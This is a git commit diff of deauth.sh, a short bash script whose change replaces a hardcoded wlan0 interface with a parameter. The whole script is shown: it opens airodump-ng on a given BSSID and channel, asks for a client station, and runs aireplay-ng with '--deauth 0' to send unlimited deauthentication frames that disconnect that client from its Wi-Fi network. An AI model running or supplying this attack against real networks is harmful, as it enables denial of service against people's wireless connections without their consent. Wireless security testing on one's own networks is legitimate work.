59a5111a9c0b3e0ec1b71a15a5d7b42addfc6e3a
ohadcohen1111 <57725202+ohadcohen1111@users.noreply.github.com>
2020-10-11 09:04:45 -0400

    Update deauth.sh

--- deauth.sh
+++ deauth.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-xterm -e airodump-ng wlan0 --bssid $1 --channel $2 &
+xterm -e airodump-ng $3 --bssid $1 --channel $2 &
 echo "Enter Station: "
 read station
 aireplay-ng --deauth 0 -a $1 -c $station $3
